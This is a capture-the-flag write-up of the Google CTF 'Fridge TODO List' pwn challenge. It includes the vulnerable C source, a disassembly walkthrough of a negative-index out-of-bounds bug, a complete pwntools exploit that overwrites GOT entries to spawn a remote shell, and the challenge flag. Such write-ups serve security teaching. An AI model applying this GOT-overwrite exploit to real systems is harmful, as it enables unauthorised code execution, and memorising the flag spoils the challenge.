# Fridge TODO List
PWN

## Description:
> One of the main selling points of smart fridge 2000 over the smart fridge 1999 is that it comes with a TODO list network service. We heard that Wintermuted uses this list as a password storage, maybe you can find a bug to leak their notes? Luckily we found the source code of the TODO list on the vendor's website.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <ctype.h>
#include <linux/limits.h>

const char BANNER[] = "\
███████╗███╗   ███╗ █████╗ ██████╗ ████████╗    ███████╗██████╗ ██╗██████╗  ██████╗ ███████╗    ██████╗  ██████╗  ██████╗  ██████╗        \n\
██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝    ╚════██╗██╔═████╗██╔═████╗██╔═████╗       \n\
███████╗██╔████╔██║███████║██████╔╝   ██║       █████╗  ██████╔╝██║██║  ██║██║  ███╗█████╗       █████╔╝██║██╔██║██║██╔██║██║██╔██║       \n\
╚════██║██║╚██╔╝██║██╔══██║██╔══██╗   ██║       ██╔══╝  ██╔══██╗██║██║  ██║██║   ██║██╔══╝      ██╔═══╝ ████╔╝██║████╔╝██║████╔╝██║       \n\
███████║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║       ██║     ██║  ██║██║██████╔╝╚██████╔╝███████╗    ███████╗╚██████╔╝╚██████╔╝╚██████╔╝       \n\
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝        \n\
                                                                                                                                          \n\
 █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗     ████████╗ ██████╗ ██████╗  ██████╗     ██╗     ██╗███████╗████████╗\n\
██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗    ██║     ██║██╔════╝╚══██╔══╝\n\
███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║███████╗   ██║   \n\
██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║╚════██║   ██║   \n\
██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝       ██║   ╚██████╔╝██████╔╝╚██████╔╝    ███████╗██║███████║   ██║   \n\
╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝        ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝     ╚══════╝╚═╝╚══════╝   ╚═╝   ";

const char MENU[] = "\n\
Hi %s, what would you like to do?\n\
1) Print TODO list\n\
2) Print TODO entry\n\
3) Store TODO entry\n\
4) Delete TODO entry\n\
5) Remote administration\n\
6) Exit\n\
> ";
const char OUT_OF_BOUNDS_MESSAGE[] = "Sorry but this model only supports 128 TODO list entries.\nPlease upgrade to the Smart Fridge 3001 for increased capacity.";

#define TODO_COUNT 128
#define TODO_LENGTH 48

int todo_fd;
char username[64];
char todos[TODO_COUNT*TODO_LENGTH];

void init() {
  system("mkdir todos 2>/dev/null");
  setlinebuf(stdout);
}

void read_line(char *buf, size_t buf_sz) {
  if (!fgets(buf, buf_sz, stdin)) {
    err(1, "fgets()");
  }
  size_t read_cnt = strlen(buf);
  if (read_cnt && buf[read_cnt-1] == '\n') {
    buf[read_cnt-1] = 0;
  }
}

bool read_all(int fd, char *buf, size_t read_sz) {
  while (read_sz) {
    ssize_t num_read = read(fd, buf, read_sz);
    if (num_read <= 0) {
      return false;
    }
    read_sz -= num_read;
    buf += num_read;
  }
  return true;
}

void write_all(int fd, char *buf, size_t write_sz) {
  while (write_sz) {
    ssize_t num_written = write(fd, buf, write_sz);
    if (num_written <= 0) {
      err(1, "write");
    }
    write_sz -= num_written;
    buf += num_written;
  }
}

bool string_is_alpha(const char *s) {
  for (; *s; s++) {
    if (!isalpha(*s)) {
      return false;
    }
  }
  return true;
}

bool list_is_empty() {
  for (int i = 0; i < TODO_COUNT; i++) {
    if(todos[i*TODO_LENGTH]) {
      return false;
    }
  }
  return true;
}

void print_list() {
  if (list_is_empty()) {
    puts("Your TODO list is empty. Enjoy your free time!");
    return;
  }
  puts("+=====+=================================================================+");
  for (int i = 0; i < TODO_COUNT; i++) {
    if(todos[i*TODO_LENGTH]) {
      printf("| %3d | %-63s |\n", i, &todos[i*TODO_LENGTH]);
    }
  }
  puts("+=====+=================================================================+");
}

void open_todos() {
  char todos_filename[PATH_MAX] = "todos/";
  strncat(todos_filename, username, sizeof(todos_filename)-strlen(todos_filename) - 1);

  todo_fd = open(todos_filename, O_RDWR);
  if (todo_fd != -1 && read_all(todo_fd, todos, sizeof(todos))) {
    if (!list_is_empty()) {
      print_list();
    }
  } else {
    todo_fd = open(todos_filename, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (todo_fd == -1) {
      err(1, "Could not create TODO storage file");
    }
  }
}

void authenticate() {
  printf("user: ");
  fflush(stdout);
  read_line(username, sizeof(username));

  if (!string_is_alpha(username)) {
    errx(1, "username can only consist of [a-zA-Z]");
  }
}

int read_int() {
  char buf[128];
  read_line(buf, sizeof(buf));
  return atoi(buf);
}

void store_todos() {
  write_all(todo_fd, todos, sizeof(todos));
  close(todo_fd);
}

void store_todo() {
  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("What's your TODO? ");
  fflush(stdout);
  read_line(&todos[idx*TODO_LENGTH], TODO_LENGTH);
}

void print_todo() {
  printf("Which entry would you like to read? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("Your TODO: %s\n", &todos[idx*TODO_LENGTH]);
}

void delete_todo() {
  printf("Which TODO number did you finish? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  todos[idx*TODO_LENGTH] = 0;
  if (list_is_empty()) {
    puts("Awesome, you cleared the whole list!");
  } else {
    puts("Nice job, keep it up!");
  }
}

bool administration_enabled() {
  return false;
}

void admin() {
  puts("Sorry, remote administration is not available right now.");
}

int main(int argc, char *argv[]) {
  init();

  puts(BANNER);

  authenticate();

  open_todos();

  while (true) {
    printf(MENU, username);
    fflush(stdout);
    int choice = read_int();
    puts("");
    switch (choice) {
      case 1:
        print_list();
        break;
      case 2:
        print_todo();
        break;
      case 3:
        store_todo();
        break;
      case 4:
        delete_todo();
        break;
      case 5:
        admin();
        break;
      case 6:
        store_todos();
        puts("Your TODO list has been stored. Have a nice day!");
        return 0;
      default:
        printf("unknown option %d\n", choice);
        break;
    }
  }
}
```

A binary file was attached.

## Solution:

The program offers a TODO-list management interface. It allows to read, store and delete TODO entries from the list, where each TODO entry is essentially a chunk of length TODO_LENGTH reserved in the `todo` global (`todos[TODO_COUNT*TODO_LENGTH]`). 

Accessing entry `idx` is done by referencing `todos[idx*TODO_LENGTH]`. Now, `int idx` is usually controlled by the user, but is checked against the upper bound of `TODO_COUNT`. 
One obvious bug, is that since `idx` should be limited to the maximum value of `TODO_COUNT - 1` and not `TODO_COUNT`. This allows us to access memory after the buffer. However, an even better bug is that this int is not checked against a lower bound!

We can combine this with the fact that `idx` is read using `read_int()`, which in turn uses `atoi`:
```c
int read_int() {
  char buf[128];
  read_line(buf, sizeof(buf));
  return atoi(buf);
}
```

This gives us the ability to enter a negative number, and reference memory before the buffer! However, we are limited to "steps" of `TODO_LENGTH` bytes, which is defined as `48`.

Let's start searching for what we can access:
```
root@kali:/media/sf_CTFs/google/todo# r2 todo
 -- Thank you for using radare2. Have a nice night!
[0x00000a10]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x00000a10]> f~todos
0x0000251a 24 str.mkdir_todos_2__dev_null
0x00000f58 45 sym.store_todos
0x00203140 6144 obj.todos
0x00000db8 280 sym.open_todos
[0x00000a10]> s obj.todos
[0x00203140]> pd 2
            ;-- todos:
            ; XREFS: DATA 0x00000cf3  DATA 0x00000d62  DATA 0x00000d80  DATA 0x00000e59  DATA 0x00000f67  DATA 0x00001000
            ; XREFS: DATA 0x00001074  DATA 0x000010ef
            0x00203140      0000           add byte [rax], al
            0x00203142      0000           add byte [rax], al

[0x00203140]> s obj.todos - (1*48)
[0x00203110]> pd 2
            0x00203110      0000           add byte [rax], al
            0x00203112      0000           add byte [rax], al
[0x00203110]> s obj.todos - (2*48)
[0x002030e0]> pd 2
            ;-- username:
            ; DATA XREF from sym.open_todos (0xe15)
            ; DATA XREFS from sym.authenticate (0xef9, 0xf05)
            ; DATA XREF from sym.main (0x117b)
            0x002030e0      0000           add byte [rax], al
            0x002030e2      0000           add byte [rax], al
[0x002030e0]> s obj.todos - (3*48)
[0x002030b0]> pd 2
            0x002030b0      0000           add byte [rax], al
            0x002030b2      0000           add byte [rax], al
[0x002030b0]> s obj.todos - (4*48)
[0x00203080]> pd 2
            ;-- reloc.open:
            ; CODE XREF from sym.imp.open (0x9d0)
            0x00203080      .qword 0x00000000000009d6
            ;-- reloc.atoi:
            ; CODE XREF from sym.imp.atoi (0x9e0)
            0x00203088      .qword 0x00000000000009e6                  ; RELOC 64 atoi
[0x00203080]> s obj.todos - (5*48)
[0x00203050]> pd 2
            ;-- reloc.strncat:
            ; CODE XREF from sym.imp.strncat (0x970)
            0x00203050      .qword 0x0000000000000976                  ; RELOC 64 strncat
            ;-- reloc.close:
            ; CODE XREF from sym.imp.close (0x980)
            0x00203058      .qword 0x0000000000000986                  ; RELOC 64 close
[0x00203050]> s obj.todos - (6*48)
[0x00203020]> pd 2
            ;-- reloc.write:
            ; CODE XREF from sym.imp.write (0x910)
            0x00203020      .qword 0x0000000000000916
            ;-- reloc.strlen:
            ; CODE XREF from sym.imp.strlen (0x920)
            0x00203028      .qword 0x0000000000000926                  ; RELOC 64 strlen
[0x00203020]>
```

We jump back 48 bytes at a time, and check the area we land at. Starting at offset (-4*48), we start landing at useful locations - the .got.plt section! Here we can overwrite function pointers and when the program wants to call the function we've overwritten, it will in fact call whichever function we set.

I chose to override `strlen` with `system`, which means I need to override `&todos[-6*48] + 8` with `system`'s address. However, our pointer arithmetic only allows us to get a pointer to `&todos[-6*48]`, so also the `write` pointer will need to be overridden with some values. We can use `/bin/sh;` as the value to override `reloc.write` (a.k.a. `write`'s .got.plt) with - this will corrupt the pointer, but if we can spawn a shell before the program calls `write`, we don't have to worry about that.

Luckily, this is the case: Our payload (`buf`) will be `/bin/sh;<system_address>`, and immediately after reading it, we will execute the following code:
```c
  if (!fgets(buf, buf_sz, stdin)) { // <-- "strlen" address gets overridden with "system"
    err(1, "fgets()");
  }
  size_t read_cnt = strlen(buf); // <-- We call strlen(buf) a.k.a. system("/bin/sh;<system_address>") and get a shell
  if (read_cnt && buf[read_cnt-1] == '\n') {
    buf[read_cnt-1] = 0;
  }
```

As explained in the comment, calling `strlen(buf)` will give us a shell.

How do we calculate the correct address to write? We will first need to leak whatever is in `&todos[-6*48]`: `write`'s .got.plt, then perform some calculations on the leaked address in order to get to `system`'s address.

When the program wants to call `write()`, it actually calls `write@plt` (addresses might vary between systems and runs):
```assembly
gdb-peda$ disas write_all
Dump of assembler code for function write_all:
...
   0x0000555555554c43 <+37>:    call   0x555555554910 <write@plt>
...
```

Here is the implementation:
```assembly
gdb-peda$ disas 0x555555554910
Dump of assembler code for function write@plt:
   0x0000555555554910 <+0>:     jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
   0x0000555555554916 <+6>:     push   0x1
   0x000055555555491b <+11>:    jmp    0x5555555548f0
End of assembler dump.
```

It will jump to the location stored at `0x555555757020`. When the program starts (before `write` was ever called, i.e. before resolution) this contains:

```
gdb-peda$ x /4xg 0x555555757020
0x555555757020: 0x0000555555554916      0x0000555555554926
0x555555757030: 0x0000555555554936      0x0000555555554946
```

As you can see, `0x0000555555554916` is a pointer back to the same area of `write@plt`:

```
Dump of assembler code for function write@plt:
   0x0000555555554910 <+0>:     jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
   0x0000555555554916 <+6>:     push   0x1
   0x000055555555491b <+11>:    jmp    0x5555555548f0
End of assembler dump.
```

The `push & jmp` logic will resolve the correct address, and store it in `0x555555757020` so that next time `write` is called, it jumps directly to the correct location (lazy binding).

We'd like the program to jump to `system`'s .plt resolution stub, instead of `write`'s one:
```assembly
gdb-peda$ info address system@plt
Symbol "system@plt" is at 0x555555554940 in a file compiled without debugging.
gdb-peda$ disas 0x555555554940
Dump of assembler code for function system@plt:
   0x0000555555554940 <+0>:     jmp    QWORD PTR [rip+0x2026f2]        # 0x555555757038
   0x0000555555554946 <+6>:     push   0x4
   0x000055555555494b <+11>:    jmp    0x5555555548f0
End of assembler dump.
```

This means we want `0x555555757020` to hold `0x0000555555554946`, so that when `write@plt` is called it will jump to `system`'s resolution logic and eventually call `system`.

What we saw now are .plt runtime addresses (which are determined at runtime), let's take a look at the addresses that the ELF contains:
```python
>>> from pwn import *
>>> e = ELF("todo")
[*] '/media/sf_CTFs/google/todo/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> hex(e.plt["write"])
'0x910'
>>> hex(e.plt["system"])
'0x940'
>>> hex(e.got["write"])
'0x203020'
```

So if we consider the runtime address as a base + offset, the base is determined at runtime and the offset comes from the ELF. Therefore, given the runtime value of `write`'s GOT entry (pointing before resolution into the resolution `write@plt`), we can now calculate the location of the resolution logic in `system@plt`:

```
0x0000555555554916  - 0x910          + 0x940           = 0x0000555555554946
'write' runtime GOT - e.plt["write"] + e.plt["system"]
```

Putting it all together:
```python
from pwn import *

LOCAL_PATH = "./todo"

def login(r, user):
    r.sendlineafter("user: ", user)

def read_menu(r):
    r.recvuntil("> ")

def read_todo(r, index):
    read_menu(r)
    r.sendline("2")
    r.sendlineafter("Which entry would you like to read?", str(index))
    r.recvuntil("Your TODO: ")
    return r.recvline(keepends = False)

def store_todo(r, index, todo):
    read_menu(r)
    r.sendline("3")
    r.sendlineafter("In which slot would you like to store the new entry?", str(index))
    r.sendlineafter("What's your TODO?", todo)
    log.info("Storing TODO: \n{}".format(hexdump(todo)))

def spawn_shell():
    e = ELF(LOCAL_PATH)
    r = remote("fridge-todo-list.ctfcompetition.com", 1337)
    login(r, "username")

    write_address = u64(read_todo(r, -6).ljust(8, '\x00'))
    log.info("Address of write() @ .got.plt: {}".format(hex(write_address))) # Entry is unresolved at the time of the leak

    log.info("Address of write() plt: {}".format(hex(e.plt["write"]))) 
    log.info("Address of system() plt: {}".format(hex(e.plt["system"])))

    base = write_address - e.plt["write"]
    log.info("Base address: {}".format(hex(base)))

    log.info("Calculates address of system() resolution logic @ plt: {}".format(hex(base + e.plt["system"])))

    payload = "/bin/sh;" + p64(base + e.plt["system"])
    store_todo(r, -6, payload)

    return r

if __name__ == "__main__":
    r = spawn_shell()
    r.interactive()
```

Output:
```
root@kali:/media/sf_CTFs/google/todo# python exploit.py
[*] '/media/sf_CTFs/google/todo/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
[*] Address of write() @ .got.plt: 0x55f5c8c03916
[*] Address of write() plt: 0x910
[*] Address of system() plt: 0x940
[*] Base address: 0x55f5c8c03006
[*] Calculates address of system() resolution logic @ plt: 0x55f5c8c03946
[*] Storing TODO:
    00000000  2f 62 69 6e  2f 73 68 3b  46 39 c0 c8  f5 55 00 00  │/bin│/sh;│F9··│·U··│
    00000010
[*] Switching to interactive mode
 $ ls
holey_beep
todo
todos
$ cd todos
$ ls
CountZero
username
$ cat CountZero
Watch Hackers (again)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Figure out why the fridge keeps beeping\x00\x00check \x00check /home/user/holey_beep\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00debug the fridge - toilet connectivity\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00follow sec advice: CTF{goo.gl/cjHknW}\x00\x00/4513753\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
...
```

The flag: CTF{goo.gl/cjHknW}